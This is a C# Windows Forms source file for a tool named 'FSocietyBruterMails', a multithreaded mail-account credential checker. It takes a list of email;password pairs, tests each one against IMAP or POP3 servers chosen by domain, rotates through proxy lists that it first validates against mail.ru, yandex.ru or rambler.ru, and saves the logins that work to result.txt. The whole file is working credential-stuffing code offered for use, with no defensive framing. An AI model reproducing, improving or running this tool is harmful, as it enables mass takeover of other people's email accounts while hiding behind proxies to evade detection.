using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using Newtonsoft.Json;
using System.Collections.Concurrent;
using MailKit.Net.Pop3;
using MailKit.Net.Proxy;
using MailKit.Net.Imap;
using Leaf.xNet;

namespace FSocietyBruterMails
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private string basefile;
        private string proxyfile;
        private string configfile = Path.Combine(Directory.GetCurrentDirectory(), "DefaultServers.json");
        private delegate void SafeCallDelegate(string text);
        List<Servers> servers;
        ConcurrentQueue<string> basequeue = new ConcurrentQueue<string>();
        ConcurrentQueue<string> proxyqueue = new ConcurrentQueue<string>();
        List<Thread> threads = new List<Thread>();
        private static ReaderWriterLockSlim _readWriteLock = new ReaderWriterLockSlim();
        private int good;
        private int bad;
        private int error;
        ConcurrentQueue<string> goodque = new ConcurrentQueue<string>();
        private volatile bool exit = false;
        public class Servers
        {
            [JsonProperty("Domains")]
            public List<string> Domains { get; set; }
            [JsonProperty("Type")]
            public string Type { get; set; }
            [JsonProperty("Hostname")]
            public string Hostname { get; set; }
            [JsonProperty("Port")]
            public int Port { get; set; }
            [JsonProperty("SocketType")]
            public string SocketType { get; set; }
            [JsonProperty("UserName")]
            public string UserName { get; set; }
        }

        private bool pop(string login, string password, string popserver, int popport, bool ssl, string proxytype, string proxyhost, int proxyport, bool getmessange)
        {
            using (var client = new Pop3Client())
            {
                if (proxytype == "socks5")
                {
                    client.ProxyClient = new Socks5Client(proxyhost, proxyport);
                }
                if (proxytype == "socks4")
                {
                    client.ProxyClient = new Socks4Client(proxyhost, proxyport);
                }
                if (proxytype == "http")
                {
                    client.ProxyClient = new MailKit.Net.Proxy.HttpProxyClient(proxyhost, proxyport);
                }
                try
                {
                    client.Connect(popserver, popport, ssl);
                    if (!client.IsConnected) return false;
                    client.Authenticate(login, password);
                    if (!client.IsAuthenticated) return false;

                    client.Disconnect(true);
                }
                catch { return false; }
            }
            return true;
        }

        private bool imap(string login, string password, string imapserver, int imapport, bool ssl, string proxytype, string proxyhost, int proxyport, bool getmessange)
        {
            using (var client = new ImapClient())
            {
                if (proxytype == "socks5")
                {
                    client.ProxyClient = new Socks5Client(proxyhost, proxyport);
                }
                if (proxytype == "socks4")
                {
                    client.ProxyClient = new Socks4Client(proxyhost, proxyport);
                }
                if (proxytype == "http")
                {
                    client.ProxyClient = new MailKit.Net.Proxy.HttpProxyClient(proxyhost, proxyport);
                }
                try
                {
                    client.Connect(imapserver, imapport, ssl);
                    if (!client.IsConnected) return false;
                    client.Authenticate(login, password);
                    if (!client.IsAuthenticated) return false;

                    client.Disconnect(true);
                }
                catch { return false; }
            }
            return true;
        }

        private void Checkerworker()
        {
            while (!exit)
            {
                string url = "http://mail.ru/";
                if (comboBox1.Items[comboBox1.SelectedIndex].ToString() == "yandex.ru") url = "http://yandex.ru/";
                if (comboBox1.Items[comboBox1.SelectedIndex].ToString() == "rambler.ru") url = "http://rambler.ru/";
                string proxy;
                var requestTimeout = 5 * 1000;
                var proxyTimeout = 5 * 1000;
                var proxyType = ProxyType.HTTP;
                bool result = proxyqueue.TryDequeue(out proxy);
                while (result && !exit)
                {
                    try
                    {
                        if (radioButton2.Checked) proxyType = ProxyType.Socks4;
                        if (radioButton3.Checked) proxyType = ProxyType.Socks5;
                        using (var request = new HttpRequest())
                        {
                            request.ConnectTimeout = requestTimeout;
                            request.Proxy = Leaf.xNet.ProxyClient.Parse(proxyType, proxy);
                            request.Proxy.ConnectTimeout = proxyTimeout;
                            request.Get(url);
                            goodque.Enqueue(proxy);
                        }
                    }
                    catch { }
                    result = proxyqueue.TryDequeue(out proxy);
                    this.Invoke((MethodInvoker)delegate
                    {
                        try
                        {
                            progressBar1.Value += 1;
                        }
                        catch { }
                    });
                }
                break;
            }
        }

        private void writetofile(string data)
        {
            _readWriteLock.EnterWriteLock();
            try
            {
                // Append text to the file
                using (StreamWriter sw = File.AppendText(Path.Combine(Directory.GetCurrentDirectory(), "result.txt")))
                {
                    sw.WriteLine(data);
                    sw.Close();
                }
            }
            finally
            {
                // Release lock
                _readWriteLock.ExitWriteLock();
            }
        }

        private void checker()
        {
            this.Invoke((MethodInvoker)delegate
            {
                progressBar1.Maximum = proxyqueue.Count;
                progressBar1.Value = 0;
            });
            for (int i = 0; i < numericUpDown1.Value; i++)
            {
                Thread t = new Thread(new ThreadStart(Checkerworker));
                t.IsBackground = true;
                t.Start();
                threads.Add(t);
            }
            foreach (var th in threads)
            {
                while (true)
                {
                    if (!th.IsAlive) break;
                }
            }
            proxyqueue.Clear();
            proxyqueue = goodque;
            this.Invoke((MethodInvoker)delegate
            {
                label10.Text = proxyqueue.Count.ToString();
                button1.Enabled = true;
                button5.Enabled = true;
                button2.Enabled = false;
                button3.Enabled = true;
                button4.Enabled = true;
                comboBox1.Enabled = true;
            });
        }

        private void thread()
        {
            while (!exit)
            {
                string line;
                bool resultb = basequeue.TryDequeue(out line);
                while (resultb && !exit)
                {
                    string username = line.Split(";")[0];
                    string password = line.Split(";")[1];
                    string domain = username.Split("@")[1];
                    string hostname = null;
                    int port = 0;
                    bool ssl = false;
                    string type = null;
                    bool result = false;
                    for (int i = 0; i < servers.Count; i++)
                    {
                        if (servers[i].Domains.Contains(domain))
                        {
                            hostname = servers[i].Hostname.ToString();
                            port = servers[i].Port;
                            type = servers[i].Type;
                            if (servers[i].SocketType == "SSL") ssl = true;
                            break;
                        }
                    }
                    switch (type)
                    {
                        case "imap":
                            for (int i = 0; i < numericUpDown2.Value; i++)
                            {
                                if (checkBox1.Checked)
                                {
                                    bool queresult;
                                    string proxy;
                                    int proxyport;
                                    string proxyhost;
                                    queresult = proxyqueue.TryDequeue(out proxy);
                                    proxyport = Int32.Parse(proxy.Split(":")[1]);
                                    proxyhost = proxy.Split(":")[0];
                                    proxyqueue.Enqueue(proxy);
                                    if (radioButton1.Checked) result = imap(username, password, hostname, port, ssl, "http", proxyhost, proxyport, false);
                                    else if (radioButton2.Checked) result = imap(username, password, hostname, port, ssl, "socks4", proxyhost, proxyport, false);
                                    else if (radioButton3.Checked) result = imap(username, password, hostname, port, ssl, "socks5", proxyhost, proxyport, false);
                                }
                                else result = imap(username, password, hostname, port, ssl, "", "", 0, false);
                                if (result)
                                {
                                    this.Invoke((MethodInvoker)delegate
                                    {
                                        dataGridView1.Rows.Add(username, password);
                                        good += 1;
                                        writetofile(line);
                                    });
                                    break;
                                }
                                else error += 1;
                                this.Invoke((MethodInvoker)delegate
                                {
                                    label2.Text = good.ToString();
                                    label4.Text = bad.ToString();
                                    label6.Text = error.ToString();
                                });
                            }
                            if (!result) bad += 1;
                            break;
                        case "pop3":
                            for (int i = 0; i < numericUpDown2.Value; i++)
                            {
                                if (checkBox1.Checked)
                                {
                                    bool queresult;
                                    string proxy;
                                    int proxyport;
                                    string proxyhost;
                                    queresult = proxyqueue.TryDequeue(out proxy);
                                    proxyport = Int32.Parse(proxy.Split(":")[1]);
                                    proxyhost = proxy.Split(":")[0];
                                    if (radioButton1.Checked) result = pop(username, password, hostname, port, ssl, "http", proxyhost, proxyport, false);
                                    if (radioButton2.Checked) result = pop(username, password, hostname, port, ssl, "socks4", proxyhost, proxyport, false);
                                    if (radioButton3.Checked) result = pop(username, password, hostname, port, ssl, "socks5", proxyhost, proxyport, false);
                                }
                                else result = pop(username, password, hostname, port, ssl, "", "", 0, false);
                                if (result)
                                {
                                    this.Invoke((MethodInvoker)delegate
                                    {
                                        dataGridView1.Rows.Add(username, password);
                                        good += 1;
                                        writetofile(line);
                                    });
                                    break;
                                }
                                else error += 1;
                                this.Invoke((MethodInvoker)delegate
                                {
                                    label2.Text = good.ToString();
                                    label4.Text = bad.ToString();
                                    label6.Text = error.ToString();
                                });
                            }
                            if (!result) bad += 1;
                            break;
                    }
                    resultb = basequeue.TryDequeue(out line);
                    this.Invoke((MethodInvoker)delegate
                    {
                        label2.Text = good.ToString();
                        label4.Text = bad.ToString();
                        label6.Text = error.ToString();
                        label8.Text = error.ToString();
                        progressBar1.Value += 1;
                    });
                }
                break;
            }
        }

        private void button1_ClickAsync(object sender, EventArgs e) //start
        {
            exit = false;
            dataGridView1.DataSource = null;
            if (textBox2.TextLength != 0)
            {
                button1.Enabled = false;
                button2.Enabled = true;
                button5.Enabled = false;
                button3.Enabled = false;
                button4.Enabled = false;
                servers = JsonConvert.DeserializeObject<List<Servers>>(File.ReadAllText(configfile));
                progressBar1.Maximum = basequeue.Count;
                progressBar1.Value = 0;
                for (int i = 0; i < numericUpDown1.Value; i++)
                {
                    if (basequeue.Count > i)
                    {
                        Thread t = new Thread(new ThreadStart(thread));
                        t.IsBackground = true;
                        t.Start();
                        threads.Add(t);
                    }
                }
            }
            else if (textBox2.TextLength == 0) MessageBox.Show("Base empty",
                                "Error",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Error);
            else if (textBox1.TextLength == 0 && checkBox1.Checked) MessageBox.Show("Proxy empty",
                                "Error",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Error);
            Thread ht = new Thread(new ThreadStart(exitfunc));
            ht.Start();
        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void exitfunc()
        {
            foreach (var th in threads)
            {
                while (true)
                {
                    if (!th.IsAlive) break;
                }
            }
            this.Invoke((MethodInvoker)delegate
            {
                button1.Enabled = true;
                button2.Enabled = false;
                button5.Enabled = true;
                button3.Enabled = true;
                button4.Enabled = true;
            });
        }

        private void button2_Click(object sender, EventArgs e) //stop
        {
            button2.Enabled = false;
            exit = true;
        }

        private void button4_Click(object sender, EventArgs e) //select base
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.InitialDirectory = "c:\\";
                openFileDialog.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
                openFileDialog.FilterIndex = 2;
                openFileDialog.RestoreDirectory = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    basefile = openFileDialog.FileName;
                    textBox2.Text = basefile;
                    basequeue.Clear();
                    var lines = File.ReadLines(basefile);
                    foreach (var line in lines) basequeue.Enqueue(line);
                    label8.Text = basequeue.Count.ToString();
                }
            }
        }

        private void button3_Click(object sender, EventArgs e) //select proxy
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.InitialDirectory = "c:\\";
                openFileDialog.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
                openFileDialog.FilterIndex = 2;
                openFileDialog.RestoreDirectory = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    proxyfile = openFileDialog.FileName;
                    textBox1.Text = proxyfile;
                    proxyqueue.Clear();
                    var proxylines = File.ReadLines(proxyfile);
                    foreach (var proxyline in proxylines) proxyqueue.Enqueue(proxyline);
                    label10.Text = proxyqueue.Count.ToString();
                }
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                radioButton1.Enabled = true;
                radioButton2.Enabled = true;
                radioButton3.Enabled = true;
                button5.Enabled = true;
                textBox1.Enabled = true;
                button3.Enabled = true;
                comboBox1.Enabled = true;
            }
            else
            {
                radioButton1.Enabled = false;
                radioButton2.Enabled = false;
                radioButton3.Enabled = false;
                button5.Enabled = false;
                textBox1.Enabled = false;
                button3.Enabled = false;
                comboBox1.Enabled = false;
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            progressBar1.Value = 0;
            exit = false;
            if (textBox1.TextLength != 0)
            {
                button1.Enabled = false;
                button2.Enabled = true;
                button3.Enabled = false;
                button5.Enabled = false;
                button4.Enabled = false;
                comboBox1.Enabled = true;
                Thread t = new Thread(new ThreadStart(checker));
                t.Start();
            }
            else MessageBox.Show("Proxy empty",
                                "Error",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Error);
        }
    }
}
